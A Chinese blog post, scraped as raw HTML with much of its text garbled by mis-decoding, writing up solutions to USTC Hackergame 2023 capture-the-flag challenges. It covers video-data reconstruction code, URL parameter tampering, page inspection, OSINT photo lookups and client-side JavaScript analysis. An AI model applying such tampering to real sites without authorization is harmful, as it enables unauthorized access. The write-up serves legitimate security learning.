output_file=\"restored_video.mp4\", frame_rate=10): \"\"\" Try to restore the video from the given data using the specified parameters. :param data: NumPy array containing the video data :param frame_count: Number of frames in the video :param width: Width of each frame :param height: Height of each frame :param output_file: Name of the output video file :return: None \"\"\" # Calculate the total number of pixels in the video total_pixels = frame_count * width * height * 3 # Check if we have enough data to fill the video if data.size \u003c total_pixels: print(f\"Not enough data to fill the video. Missing {total_pixels - data.size} pixels.\") return # Trim the data to fit the video exactly print(\"data used percentage:\", total_pixels / data.size * 100) data = data[:total_pixels] # Reshape the data to create the video frames frames = data.reshape((frame_count, height, width, 3)) # Define the codec and create a video writer object fourcc = cv2.VideoWriter_fourcc(*\"mp4v\") out = cv2.VideoWriter(output_file, fourcc, frame_rate, (width, height)) # Write each frame to the video file for i in range(frame_count): out.write(frames[i].astype(np.uint8)) # Release the video writer object out.release() print(\"Video restored and saved to\", output_file) # return first frame return frames.astype(np.uint8) # Example usage: restore_video(video_data, 300, 640, 480) # Note: The frame_count, width, and height parameters are just examples and need to be adjusted. width = 640 frame_count=138 frame = restore_video(video_data_padded, frame_count,width , 510, frame_rate=10) è§†é¢‘çš„é•¿å®½éœ€è¦è‡ªå·±çŒœï¼Œåªè¦å®½åº¦çŒœçš„å·®ä¸å¤šäº†åŸºæœ¬éƒ½èƒ½çœ‹å‡ºflagï¼ˆæ„Ÿè§‰æˆ‘çŒœçš„å®½åº¦ä¼¼ä¹ä¹Ÿä¸å¤ªå¯¹ï¼Œä¸è¿‡å·²ç»èƒ½åˆ†è¾¨å‡ºæ¥äº†ï¼‰ï¼Œå¯ä»¥ä»å¸¸è§çš„è§†é¢‘é•¿å®½é‡Œä¸€ä¸ªä¸€ä¸ªæµ‹è¯•ï¼ˆä½†æ²¡æƒ³åˆ°å‡ºé¢˜ç”¨çš„åŸå§‹è§†é¢‘æ˜¯ç«–ç€çš„ï¼Œå› æ­¤çœ‹èµ·æ¥æ¯”è¾ƒæ€ªï¼‰ã€‚\nrestored video flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC} ä½å¸¦å®½æ˜Ÿçƒ å°è¯•ç‰›åˆ€ è½¬æ¢æˆsvgå°±è¡Œï¼ˆä½†ä¾ç„¶è¾¾ä¸åˆ°ç¬¬äºŒé—®50byteçš„è¦æ±‚ï¼‰ï¼š\n","wordCount":"8014","inLanguage":"zh","image":"https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/score.png","datePublished":"2023-11-04T18:00:00Z","dateModified":"2024-04-18T21:09:32+08:00","author":{"@type":"Person","name":"sparktour"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/"},"publisher":{"@type":"Organization","name":"Sparktour's Blog","logo":{"@type":"ImageObject","url":"https://blog.sparktour.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.sparktour.me/ accesskey=h title="Sparktour's Blog (Alt + H)">Sparktour's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://blog.sparktour.me/en/ title=English aria-label=English>English</a></li></ul></div></div><ul id=menu><li><a href=https://blog.sparktour.me/archives title=Archive><span>Archive</span></a></li><li><a href=https://blog.sparktour.me/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://blog.sparktour.me/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://blog.sparktour.me/about/ title=About><span>About</span></a></li><li><a href=https://blog.sparktour.me/friends/ title=Friends><span>Friends</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.sparktour.me/>ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href=https://blog.sparktour.me/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">USTC Hackergame 2023 Writeup</h1><div class=post-meta><span title='2023-11-04 18:00:00 +0000 UTC'>2023-11-04</span>&nbsp;Â·&nbsp;<span title='2024-04-18 21:09:32 +0800 +0800'>æ›´æ–°äº: 2024-04-18</span>&nbsp;Â·&nbsp;16 åˆ†é’Ÿ&nbsp;Â·&nbsp;sparktour</div></header><figure class=entry-cover><img loading=eager src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/score.png alt="hackergame score"><figcaption>hackergame score</figcaption></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>ç›®å½•</span></summary><div class=inner><ul><li><a href=#%e5%81%9a%e5%87%ba%e6%9d%a5%e7%9a%84%e9%83%a8%e5%88%86 aria-label=åšå‡ºæ¥çš„éƒ¨åˆ†>åšå‡ºæ¥çš„éƒ¨åˆ†</a><ul><li><a href=#hackergame-%e5%90%af%e5%8a%a8 aria-label="Hackergame å¯åŠ¨">Hackergame å¯åŠ¨</a></li><li><a href=#%e7%8c%ab%e5%92%aa%e5%b0%8f%e6%b5%8b aria-label=çŒ«å’ªå°æµ‹>çŒ«å’ªå°æµ‹</a></li><li><a href=#%e6%9b%b4%e6%b7%b1%e6%9b%b4%e6%9a%97 aria-label=æ›´æ·±æ›´æš—>æ›´æ·±æ›´æš—</a></li><li><a href=#%e6%97%85%e8%a1%8c%e7%85%a7%e7%89%87-30 aria-label="æ—…è¡Œç…§ç‰‡ 3.0">æ—…è¡Œç…§ç‰‡ 3.0</a></li><li><a href=#%e8%b5%9b%e5%8d%9a%e4%ba%95%e5%ad%97%e6%a3%8b aria-label=èµ›åšäº•å­—æ£‹>èµ›åšäº•å­—æ£‹</a></li><li><a href=#%e5%a5%b6%e5%a5%b6%e7%9a%84%e7%9d%a1%e5%89%8d-flag-%e6%95%85%e4%ba%8b aria-label="å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹">å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹</a></li><li><a href=#%e7%bb%84%e5%a7%94%e4%bc%9a%e6%a8%a1%e6%8b%9f%e5%99%a8 aria-label=ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨>ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨</a></li><li><a href=#%e8%99%ab aria-label=è™«>è™«</a></li><li><a href=#json--yaml aria-label="JSON âŠ‚ YAML?">JSON âŠ‚ YAML?</a><ul><li><a href=#json--yaml-11 aria-label="JSON âŠ„ YAML 1.1">JSON âŠ„ YAML 1.1</a></li><li><a href=#json--yaml-12 aria-label="JSON âŠ„ YAML 1.2">JSON âŠ„ YAML 1.2</a></li></ul></li><li><a href=#git-git aria-label="Git? Git!">Git? Git!</a></li><li><a href=#http-%e9%9b%86%e9%82%ae%e5%86%8c aria-label="HTTP é›†é‚®å†Œ">HTTP é›†é‚®å†Œ</a><ul><li><a href=#%e6%b2%a1%e6%9c%89%e7%8a%b6%e6%80%81%e5%93%88%e9%9d%9e%e9%a2%84%e6%9c%9f aria-label=æ²¡æœ‰çŠ¶æ€â€¦â€¦å“ˆï¼Ÿï¼ˆéé¢„æœŸï¼‰>æ²¡æœ‰çŠ¶æ€â€¦â€¦å“ˆï¼Ÿï¼ˆéé¢„æœŸï¼‰</a></li><li><a href=#512-%e7%a7%8d%e7%8a%b6%e6%80%81%e7%a0%81 aria-label="5/12 ç§çŠ¶æ€ç ">5/12 ç§çŠ¶æ€ç </a><ul><li><a href=#100-continue aria-label="100 Continue">100 Continue</a></li><li><a href=#200-ok aria-label="200 OK">200 OK</a></li><li><a href=#206-partial-content aria-label="206 Partial Content">206 Partial Content</a></li><li><a href=#304-not-modified aria-label="304 Not Modified">304 Not Modified</a></li><li><a href=#400-bad-request aria-label="400 Bad Request">400 Bad Request</a></li><li><a href=#404-not-found aria-label="404 Not Found">404 Not Found</a></li><li><a href=#405-method-not-allowed aria-label="405 Method Not Allowed">405 Method Not Allowed</a></li><li><a href=#412-precondition-failed aria-label="412 Precondition Failed">412 Precondition Failed</a></li><li><a href=#413-payload-too-large aria-label="413 Payload Too Large">413 Payload Too Large</a></li><li><a href=#414-uri-too-long aria-label="414 URI Too Long">414 URI Too Long</a></li><li><a href=#416-range-not-satisfiable aria-label="416 Range Not Satisfiable">416 Range Not Satisfiable</a></li><li><a href=#505-http-version-not-supported aria-label="505 HTTP Version Not Supported">505 HTTP Version Not Supported</a></li></ul></li></ul></li><li><a href=#docker-for-everyone aria-label="Docker for Everyone">Docker for Everyone</a></li><li><a href=#%e6%83%9c%e5%ad%97%e5%a6%82%e9%87%91-20 aria-label="æƒœå­—å¦‚é‡‘ 2.0">æƒœå­—å¦‚é‡‘ 2.0</a></li><li><a href=#%e9%ab%98%e9%a2%91%e7%8e%87%e6%98%9f%e7%90%83 aria-label=é«˜é¢‘ç‡æ˜Ÿçƒ>é«˜é¢‘ç‡æ˜Ÿçƒ</a></li><li><a href=#%e5%b0%8f%e5%9e%8b%e5%a4%a7%e8%af%ad%e8%a8%80%e6%a8%a1%e5%9e%8b%e6%98%9f%e7%90%83 aria-label=å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ>å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ</a><ul><li><a href=#you-are-smart aria-label="You Are Smart">You Are Smart</a></li><li><a href=#accepted aria-label=Accepted>Accepted</a></li></ul></li><li><a href=#%e6%b5%81%e5%bc%8f%e6%98%9f%e7%90%83 aria-label=æµå¼æ˜Ÿçƒ>æµå¼æ˜Ÿçƒ</a></li><li><a href=#%e4%bd%8e%e5%b8%a6%e5%ae%bd%e6%98%9f%e7%90%83 aria-label=ä½å¸¦å®½æ˜Ÿçƒ>ä½å¸¦å®½æ˜Ÿçƒ</a><ul><li><a href=#%e5%b0%8f%e8%af%95%e7%89%9b%e5%88%80 aria-label=å°è¯•ç‰›åˆ€>å°è¯•ç‰›åˆ€</a></li></ul></li><li><a href=#komm-s%c3%bcsser-flagge aria-label="Komm, sÃ¼sser Flagge">Komm, sÃ¼sser Flagge</a><ul><li><a href=#%e6%88%91%e7%9a%84-post aria-label="æˆ‘çš„ POST">æˆ‘çš„ POST</a></li><li><a href=#%e6%88%91%e7%9a%84-p aria-label="æˆ‘çš„ P">æˆ‘çš„ P</a></li><li><a href=#%e6%88%91%e7%9a%84-get%e9%9d%9e%e9%a2%84%e6%9c%9f aria-label="æˆ‘çš„ GETï¼ˆéé¢„æœŸï¼‰">æˆ‘çš„ GETï¼ˆéé¢„æœŸï¼‰</a></li></ul></li><li><a href=#%e4%b8%ba%e4%bb%80%e4%b9%88%e8%a6%81%e6%89%93%e5%bc%80-flag- aria-label="ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡">ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡</a><ul><li><a href=#ld_preload-love aria-label="LD_PRELOAD, love!">LD_PRELOAD, love!</a></li></ul></li><li><a href=#%e5%bc%82%e6%98%9f%e6%ad%a7%e9%80%94 aria-label=å¼‚æ˜Ÿæ­§é€”>å¼‚æ˜Ÿæ­§é€”</a><ul><li><a href=#%e7%ac%ac%e4%b8%80%e7%bb%84 aria-label=ç¬¬ä¸€ç»„>ç¬¬ä¸€ç»„</a></li><li><a href=#%e7%ac%ac%e4%ba%8c%e7%bb%84 aria-label=ç¬¬äºŒç»„>ç¬¬äºŒç»„</a></li><li><a href=#%e7%ac%ac%e4%b8%89%e7%bb%84 aria-label=ç¬¬ä¸‰ç»„>ç¬¬ä¸‰ç»„</a></li><li><a href=#%e7%ac%ac%e5%9b%9b%e7%bb%84 aria-label=ç¬¬å››ç»„>ç¬¬å››ç»„</a></li></ul></li></ul></li><li><a href=#%e6%b2%a1%e5%81%9a%e5%87%ba%e4%bd%86%e5%b0%9d%e8%af%95%e8%bf%87%e7%9a%84%e9%83%a8%e5%88%86 aria-label=æ²¡åšå‡ºï¼Œä½†å°è¯•è¿‡çš„éƒ¨åˆ†>æ²¡åšå‡ºï¼Œä½†å°è¯•è¿‡çš„éƒ¨åˆ†</a><ul><li><a href=#%e5%b0%8f%e5%9e%8b%e5%a4%a7%e8%af%ad%e8%a8%80%e6%a8%a1%e5%9e%8b%e6%98%9f%e7%90%83-1 aria-label=å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ>å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ</a><ul><li><a href=#hackergame%e5%92%8c aria-label=Hackergameå’ŒğŸ®>Hackergameå’ŒğŸ®</a></li></ul></li><li><a href=#%e4%bd%8e%e5%b8%a6%e5%ae%bd%e6%98%9f%e7%90%83-1 aria-label=ä½å¸¦å®½æ˜Ÿçƒ>ä½å¸¦å®½æ˜Ÿçƒ</a><ul><li><a href=#%e6%9e%81%e8%87%b4%e5%8e%8b%e7%bc%a9 aria-label=æè‡´å‹ç¼©>æè‡´å‹ç¼©</a></li></ul></li><li><a href=#o1-%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e7%b3%bb%e7%bb%9f aria-label="O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ">O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ</a></li><li><a href=#%e5%b0%8f-z-%e7%9a%84%e8%b0%9c%e9%a2%98 aria-label="å° Z çš„è°œé¢˜">å° Z çš„è°œé¢˜</a><ul><li><a href=#%e6%a0%87%e5%87%86%e8%a7%a3%e7%ad%94%e6%96%b9%e6%a1%88%e7%9a%84%e5%8f%af%e8%a7%86%e5%8c%96 aria-label=æ ‡å‡†è§£ç­”æ–¹æ¡ˆçš„å¯è§†åŒ–ï¼š>æ ‡å‡†è§£ç­”æ–¹æ¡ˆçš„å¯è§†åŒ–ï¼š</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><p>è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œ<del>ç¯å¢ƒå­¦</del>çŸ¥è¯†ç›¸å…³å’Œ<del>ChatGPTçš„æ¨ªç©ºå‡ºä¸–</del>ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚</p><h1 id=åšå‡ºæ¥çš„éƒ¨åˆ†>åšå‡ºæ¥çš„éƒ¨åˆ†<a hidden class=anchor aria-hidden=true href=#åšå‡ºæ¥çš„éƒ¨åˆ†>#</a></h1><h2 id=hackergame-å¯åŠ¨>Hackergame å¯åŠ¨<a hidden class=anchor aria-hidden=true href=#hackergame-å¯åŠ¨>#</a></h2><pre tabindex=0><code>https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity=
</code></pre><p>æ³¨æ„åˆ°ç½‘é¡µæœ‰ä¸€ä¸ª<code>similarity=</code>çš„paramï¼Œæäº¤<code>similarity=100</code>å³å¯</p><h2 id=çŒ«å’ªå°æµ‹>çŒ«å’ªå°æµ‹<a hidden class=anchor aria-hidden=true href=#çŒ«å’ªå°æµ‹>#</a></h2><blockquote><p>æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿ<strong>ï¼ˆ30 åˆ†ï¼‰</strong></p></blockquote><p>åœ¨USTCçš„å›¾ä¹¦é¦†ç½‘ç«™ä¸Šæ‰¾ä¹¦åï¼Œå³å¯çœ‹åˆ°è¿™æœ¬ä¹¦åœ¨â€œè¥¿åŒºå¤–æ–‡ä¹¦åº“â€ã€‚å†googleä¸€ä¸‹å°±èƒ½å‘ç°ä¹¦åº“åœ¨12å±‚ï¼š</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/ustc-lib.png alt=USTCå›¾ä¹¦é¦†æŸ¥è¯¢åˆ°çš„å›¾ä¹¦ä½ç½®æˆªå›¾><figcaption>USTCå›¾ä¹¦é¦†æŸ¥è¯¢åˆ°çš„å›¾ä¹¦ä½ç½®æˆªå›¾</figcaption></figure></p><blockquote><p>ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿ</p></blockquote><p>googleåæ‰¾åˆ°äº† <a href=https://www.zhihu.com/question/20337132/answer/3023506910>ä½ è§è¿‡å“ªäº›æå“è®ºæ–‡ï¼Ÿ - çŸ¥ä¹ (zhihu.com)</a>ï¼Œé‡Œé¢ç›´æ¥æåˆ°äº†æ˜¯23æ¬¡æ–¹ã€‚</p><blockquote><p>ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨<strong>ç¼–è¯‘</strong> Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿ<strong>ï¼ˆ20 åˆ†ï¼‰</strong></p></blockquote><p>google â€œtcp bbr kernel configâ€èƒ½æ‰¾åˆ°<code>CONFIG_TCP_CONG_BBR</code>ã€‚</p><blockquote><p>ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ <del>MyPY</del> mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿ</p></blockquote><p>æœ<code>mypy python type checking "halting problem"</code>ï¼Œå°±èƒ½æ‰¾åˆ° <a href=https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf>https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf</a> ï¼Œurlé‡Œå°±èƒ½çœ‹åˆ°ä¼šè®®å«<code>ECOOP</code>äº†ã€‚</p><h2 id=æ›´æ·±æ›´æš—>æ›´æ·±æ›´æš—<a hidden class=anchor aria-hidden=true href=#æ›´æ·±æ›´æš—>#</a></h2><p>æ‰“å¼€elementsæœ<code>flag{</code>å³å¯</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/inspect-elements.png alt=æŸ¥çœ‹ç½‘é¡µå…ƒç´ ><figcaption>æŸ¥çœ‹ç½‘é¡µå…ƒç´ </figcaption></figure></p><h2 id=æ—…è¡Œç…§ç‰‡-30>æ—…è¡Œç…§ç‰‡ 3.0<a hidden class=anchor aria-hidden=true href=#æ—…è¡Œç…§ç‰‡-30>#</a></h2><ol><li><p>**ä½ è¿˜è®°å¾—ä¸å­¦é•¿è§é¢è¿™å¤©æ˜¯å“ªä¸€å¤©å—ï¼Ÿï¼ˆæ ¼å¼ï¼šyyyy-mm-ddï¼‰**åƒæ‹‰é¢çš„ç…§ç‰‡å¯ä»¥çœ‹å‡ºâ€œå­¦é•¿â€å»çš„æ˜¯<code>STATPHYS28</code> ï¼ˆhttps://statphys28.org/ï¼‰ï¼Œä¸€å¤©ä¸€å¤©è¯•å¯ä»¥è¯•å‡ºæ˜¯<code>2023-08-10</code></p></li><li><p>**åœ¨å­¦æ ¡è¯¥å±•å…å±•ç¤ºçš„æ‰€æœ‰åŒç§é‡‘è‰²å¥–ç‰Œçš„å¾—ä¸»ä¸­ï¼Œå‡ºç”Ÿæœ€æ™šè€…è·å¥–æ—¶æ‰€åœ¨çš„ç ”ç©¶æ‰€ç¼©å†™æ˜¯ä»€ä¹ˆï¼Ÿ**æ‰¾ä¸œäº¬å¤§å­¦è·å¾—è¯ºè´å°”å¥–çš„æ•™æˆï¼Œå¯ä»¥æ‰¾åˆ°æ¯”è¾ƒå¹´è½»çš„é‚£ä½æ˜¯<a href=https://en.wikipedia.org/wiki/Takaaki_Kajita>Takaaki Kajita - Wikipedia</a>ï¼Œå·¥ä½œç ”ç©¶æ‰€æ˜¯<code>ICRR</code></p></li><li><p>**å¸ç¯·ä¸­æ´»åŠ¨æ‹›å‹Ÿå¿—æ„¿è€…æ—¶ç”¨äºæ”¶é›†æŠ¥åä¿¡æ¯çš„åœ¨çº¿é—®å·çš„ç¼–å·ï¼ˆä»¥å­—æ¯ S å¼€å¤´åæ¥æ•°å­—ï¼‰æ˜¯å¤šå°‘ï¼Ÿ**æ–‡ä¸­æåˆ°äº†â€œ<em>å½“ä½ ä»¬èµ°åˆ°ä¸€åº§åšç‰©é¦†å‰æ—¶ï¼Œ é©¬è·¯å¯¹é¢çš„å–·æ³‰å’Œå®ƒå‘¨å›´çš„æ™¯è‰²å¼•èµ·äº†ä½ çš„æ³¨æ„ã€‚</em>â€ï¼Œåœ¨googleåœ°å›¾ä¸Šçš„ä¸Šé‡ç«™é™„è¿‘çœ‹äº†ä¸€ä¸‹ä¹‹åå‘ç°è¿™ä¸ªå–·æ³‰æ¯”è¾ƒæ¥è¿‘â€œä¸Šé‡å…¬å›­å¤§å–·æ°´â€ï¼Œæœç´¢â€œ<code>ä¸Šé‡å…¬åœ’ ç«¹ã®å°åºƒå ´ (å™´æ°´åºƒå ´) 2023-08-10</code>â€å¯ä»¥æœåˆ°<a href=https://prtimes.jp/main/html/rd/p/000000035.000021306.html>ï¼”å¹´ã¶ã‚Šã®é–‹å‚¬ï¼ã€Œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023ã€ã‚’ä¸Šé‡å…¬åœ’å™´æ°´åºƒå ´ã«ã¦é–‹å‚¬ï¼åŒ—ã‹ã‚‰å—ã¾ã§æ—¥æœ¬å…¨å›½ã®é…’è”µãŒé€ ã‚‹ç¾å‘³ã—ã„ã€Œæ¢…é…’ã€ï¼‘ï¼—ï¼ç¨®é¡ä»¥ä¸Šã‚’é£²ã¿æ¯”ã¹ã€‚ï½œä¸€èˆ¬ç¤¾å›£æ³•äººæ¢…é…’ç ”ç©¶ä¼šã®ãƒ—ãƒ¬ã‚¹ãƒªãƒªãƒ¼ã‚¹ (prtimes.jp)</a>ï¼Œé‡Œé¢å°±èƒ½æ‰¾åˆ°å¿—æ„¿è€…çš„çš„æŠ¥åç½‘é¡µ<code>https://ws.formzu.net/dist/S495584522/</code>ã€‚</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/ueno-google-map.jpg alt=ä¸Šé‡å…¬å›­çš„googleåœ°å›¾><figcaption>ä¸Šé‡å…¬å›­çš„googleåœ°å›¾</figcaption></figure></p></li><li><p><strong>å­¦é•¿è´­ä¹°è‡ªå·±çš„åšç‰©é¦†é—¨ç¥¨æ—¶ï¼ŒèŠ±è´¹äº†å¤šå°‘æ—¥å…ƒï¼Ÿ</strong><a href="https://www.tnm.jp/modules/r_free_page/index.php?id=113#ticket">ä¸œäº¬å›½ç«‹åšç‰©é¦†</a>å¤§å­¦ç”Ÿå…è´¹ï¼ˆ0ï¼‰</p></li><li><p>**å­¦é•¿å½“å¤©æ™šä¸Šéœ€è¦åœ¨å“ªæ ‹æ ‡å¿—æ€§å»ºç­‘ç‰©çš„é™„è¿‘é›†åˆå‘¢ï¼Ÿ**æŸ¥<a href=https://statphys28.org/banquet.html>STATPHYS28çš„ç½‘ç«™</a>èƒ½æ‰¾åˆ°åœ¨é›†åˆåœ°ç‚¹åœ¨<code>å®‰ç”°è®²å ‚</code>ã€‚</p></li><li><p>**è¿›ç«™æ—¶ï¼Œä½ åœ¨ JR ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£å¤–çœ‹åˆ°ã€Œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ã€æ´»åŠ¨æ­£åœ¨é”€å”®åŠ¨ç‰©å‘¨è¾¹å•†å“ï¼Œè¯¥æ´»åŠ¨å¼ è´´çš„ç²‰è‰²èƒŒæ™¯æµ·æŠ¥ä¸Šæ˜¯ä»€ä¹ˆåŠ¨ç‰©ï¼ˆè®°ä½œ Aï¼Œä¸¤ä¸ªæ±‰å­—ï¼‰ï¼Ÿ åœ¨å‡ºç«™å¤„é™„è¿‘å»ºç­‘çš„å±‹é¡¶å¹¿å‘Šç‰Œä¸Šï¼Œæ¯å°æ—¶éƒ½ä¼šé¡½çš®å‡ºç°çš„é‚£åª 3D åŠ¨ç‰©æ˜¯ä»€ä¹ˆå“ç§ï¼Ÿï¼ˆè®°ä½œ Bï¼Œä¸‰ä¸ªæ±‰å­—ï¼‰ï¼Ÿï¼ˆæ ¼å¼ï¼šA-Bï¼‰**æœ<code>ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ ä¸Šé‡é§…</code>èƒ½æœåˆ°è¿™ä¸ª<a href=https://www.instagram.com/p/Cvrw425vK_n/>instagram post</a>ï¼Œé‡Œé¢æ˜¯<code>ç†ŠçŒ«</code>ï¼›ç”¨google lensè¯†åˆ«æœ€åä¸€å¼ å›¾èƒ½æœåˆ°è¿™ä¸ªè£…é¥°åœ¨<code>Super Mario Bros.Shop </code>ï¼Œåœ¨æ¸‹è°·é§…æ—è¾¹ï¼Œæœ<code>æ¸‹è°·é§… 3d åŠ¨ç‰©</code>èƒ½æ‰¾åˆ°åŠ¨ç‰©æ˜¯<code>ç§‹ç”°çŠ¬</code></p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/google-lens.jpg alt="google lensçš„è¯†åˆ«ç»“æœ"><figcaption>google lensçš„è¯†åˆ«ç»“æœ</figcaption></figure></p></li></ol><h2 id=èµ›åšäº•å­—æ£‹>èµ›åšäº•å­—æ£‹<a hidden class=anchor aria-hidden=true href=#èµ›åšäº•å­—æ£‹>#</a></h2><p>ç†è®ºä¸Šè·Ÿæ­£ç¡®å®ç°ç®—æ³•çš„AIä¸‹æ£‹ï¼Œæœ€å¤šåªèƒ½å¹³å±€ã€‚å› æ­¤ç¿»é˜…jsï¼Œæ³¨æ„åˆ°äº†å®ƒå‘é€æ£‹ç›˜çš„è¯·æ±‚æ˜¯é˜»å¡çš„ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl>    <span class=kr>async</span> <span class=nx>run</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>isRunning</span> <span class=o>||</span> <span class=k>this</span><span class=p>.</span><span class=nx>queue</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>.</span><span class=nx>isRunning</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=p>{</span> <span class=nx>func</span><span class=p>,</span> <span class=nx>context</span><span class=p>,</span> <span class=nx>args</span><span class=p>,</span> <span class=nx>resolve</span><span class=p>,</span> <span class=nx>reject</span> <span class=p>}</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>queue</span><span class=p>.</span><span class=nx>shift</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=k>try</span> <span class=p>{</span>
